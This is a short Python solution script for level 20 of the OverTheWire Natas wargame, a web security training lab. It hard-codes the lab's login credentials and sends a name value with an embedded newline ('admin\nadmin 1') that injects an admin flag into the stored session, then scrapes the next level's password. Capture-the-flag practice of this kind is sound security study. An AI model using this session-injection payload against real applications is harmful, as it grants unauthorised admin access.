import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    auth = HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
    cook = {'PHPSESSID':'tald'}
    param = {'submit':'Change name', 'name':'admin\nadmin 1', }
    requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
    r = requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    get_pass()
